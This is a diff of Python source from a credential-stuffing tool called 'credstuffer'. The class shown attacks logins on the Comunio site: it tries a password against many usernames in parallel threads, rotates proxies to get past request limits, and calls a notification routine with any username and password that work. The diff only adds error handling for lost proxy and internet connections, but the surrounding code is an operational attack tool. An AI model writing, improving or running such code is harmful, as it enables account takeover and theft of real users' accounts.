@@ -3,7 +3,7 @@ import requests
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
 from credstuffer import UserAccount
-from credstuffer.exceptions import ProxyNotSetError, ProxyMaxRequestError, ProxyBadConnectionError
+from credstuffer.exceptions import ProxyNotSetError, ProxyMaxRequestError, ProxyBadConnectionError, InternetConnectionError
 
 
 class Comunio(UserAccount):
@@ -52,7 +52,7 @@ class Comunio(UserAccount):
 
             # check if we need a new proxy
             if self.request_counter < self.max_requests:
-
+                #try:
                 with ThreadPoolExecutor(max_workers=len(self.usernames)) as executor:
 
                     future_response = {executor.submit(self.__request_login, user, password): user for user in self.usernames}
@@ -68,6 +68,8 @@ class Comunio(UserAccount):
                             self.send_notification(username=user, password=password)
                         if statuscode == 500:
                             self.logger.error(future.result().text)
+                #except Exception as ex:
+                #    self.logger.error(ex)
             else:
                 # raise Error to renew Proxy
                 self.request_counter = 0
@@ -88,12 +90,12 @@ class Comunio(UserAccount):
                                               timeout=self.login_request_timeout, allow_redirects=False)
             
             self.request_counter += 1
-        except (requests.exceptions.ProxyError, requests.exceptions.ConnectTimeout, requests.exceptions.ReadTimeout) as e:
-            # self.logger.error(e)
-            raise ProxyBadConnectionError("Proxy Bad Connection")
 
-        except requests.exceptions.RequestException as e:
-            raise ProxyBadConnectionError("Proxy Bad Connection")
+        except requests.exceptions.RequestException as ex:
+            if self.is_internet_available():
+                raise ProxyBadConnectionError("Proxy Bad Connection: Exception: {}".format(ex))
+            else:
+                raise InternetConnectionError("InternetConnectionError: {}".format(ex))
 
         return request_login
 
